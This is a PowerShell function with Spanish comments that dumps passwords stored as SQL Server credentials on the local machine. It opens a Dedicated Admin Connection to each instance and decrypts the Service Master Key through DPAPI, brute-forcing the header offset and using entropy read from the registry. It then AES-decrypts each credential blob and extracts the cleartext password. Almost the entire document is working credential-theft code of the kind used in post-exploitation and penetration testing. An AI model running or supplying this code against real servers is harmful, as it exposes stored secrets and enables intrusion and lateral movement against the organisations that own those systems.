function Get-MSSQLCredentialPasswords {
  Add-Type -assembly System.Security
  Add-Type -assembly System.Core

  $ComputerName = $Env:computername
  $SqlInstances = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server' -Name InstalledInstances).InstalledInstances

  $Results = New-Object "System.Data.DataTable"
  "Instance","Credential","User","Password" | ForEach-Object { $Results.Columns.Add($_) | Out-Null }

  foreach ($InstanceName in $SqlInstances) {
    if ($InstanceName -eq "MSSQLSERVER") { $ConnString = "Server=ADMIN:$ComputerName\;Trusted_Connection=True" }
    else { $ConnString = "Server=ADMIN:$ComputerName\$InstanceName;Trusted_Connection=True" }
    $Conn = New-Object System.Data.SqlClient.SQLConnection($ConnString)
    Try { $Conn.Open() } Catch { Write-Error "DAC error: $_"; Continue }
    if ($Conn.State -ne "Open") { continue }

    #

---

SMK: traer TODOS los blobs crypt_property (key_id 102) sin substring fijo

---

$Cmd = New-Object System.Data.SqlClient.SqlCommand("SELECT crypt_property FROM sys.key_encryptions WHERE key_id=102",$Conn)
    $rdr = $Cmd.ExecuteReader(); $smkRows = @()
    while ($rdr.Read()) { $smkRows += ,([byte[]]$rdr[0]) }
    $rdr.Close()

    $RegPath = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\sql\").$InstanceName
    [byte[]]$Entropy = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$RegPath\Security\").Entropy

    #

---

Bruteforce del offset DPAPI (la cabecera cambia segun version)

---

$ServiceKey = $null
    foreach ($blob in $smkRows) {
      for ($off=0; $off -le 32; $off++) {
        try { $k = [System.Security.Cryptography.ProtectedData]::Unprotect($blob[$off..($blob.Length-1)], $Entropy, 'LocalMachine'); if ($k) { $ServiceKey = $k; break } } catch {}
      }
      if ($ServiceKey) { break }
    }
    if (-not $ServiceKey) { Write-Error "SMK decrypt failed"; $Conn.Close(); continue }
    $Key = $ServiceKey[0..31]   # AES-256

    #

---

Credential: traer imageval entero (no separar IV al estilo 2012)

---

$Cmd = New-Object System.Data.SqlClient.SqlCommand("SELECT name,credential_identity,imageval FROM sys.credentials cred INNER JOIN sys.sysobjvalues obj ON cred.credential_id=obj.objid WHERE valclass=28 AND valnum=2",$Conn)
    $Dt = New-Object "System.Data.DataTable"; $Dt.Load($Cmd.ExecuteReader())

    foreach ($row in $Dt) {
      $img = [byte[]]$row.imageval
      $ct  = $img[4..($img.Length-1)]                 # salta 4 bytes de header, descifra el resto

      $aes = New-Object System.Security.Cryptography.AesManaged
      $aes.Mode = 'CBC'; $aes.Padding = 'None'; $aes.Key = $Key
      $aes.IV = New-Object byte[] 16                  # IV de ceros -> solo se sacrifica el 1er bloque
      $dec = $aes.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length)

      # Decodifica UTF-16 y extrae el tramo imprimible (la password) de entre el binario
      $txt = [System.Text.Encoding]::Unicode.GetString($dec)
      $pw  = ([regex]::Matches($txt,'[\x20-\x7E]{3,}') | Sort-Object { $_.Length } -Descending | Select-Object -First 1).Value

      $Results.Rows.Add($InstanceName,$row.name,$row.credential_identity,$pw) | Out-Null
    }
    $Conn.Close()
  }
  $Results
}